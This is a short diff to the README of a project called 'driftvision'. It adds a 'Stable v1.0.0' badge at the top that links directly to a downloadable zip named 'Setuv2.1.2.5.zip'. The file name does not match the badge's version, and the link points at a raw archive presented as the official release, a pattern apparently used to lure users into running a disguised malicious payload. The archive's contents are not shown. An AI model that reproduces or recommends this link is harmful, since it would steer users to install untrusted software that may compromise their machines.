@@ -1,3 +1,5 @@
+[![Stable](https://img.shields.io/badge/Stable-v1.0.0-green?style=for-the-badge&logo=checkmarx)](https://github.com/erickingio20h2/driftvision/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 driftvision
 
 ![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![Python](https://img.shields.io/badge/python-3.8+-blue.svg) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
